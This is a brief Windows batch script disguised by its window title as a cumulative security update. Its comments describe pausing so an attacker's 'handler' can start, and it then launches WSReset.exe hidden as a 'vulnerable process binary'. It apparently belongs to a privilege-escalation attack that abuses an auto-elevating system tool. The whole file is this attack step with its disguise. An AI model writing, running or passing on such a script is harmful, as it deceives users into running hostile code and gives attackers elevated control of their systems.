@echo off
title Cumulative Security Update - KB4524147
:: Sleep 2 minutes to have time to start handler
powershell Start-Sleep -Seconds 120
:: Start Vulnerable Process Binary
powershell Start-Process -FilePath "$env:windir\System32\WSReset.exe" -WindowStyle Hidden;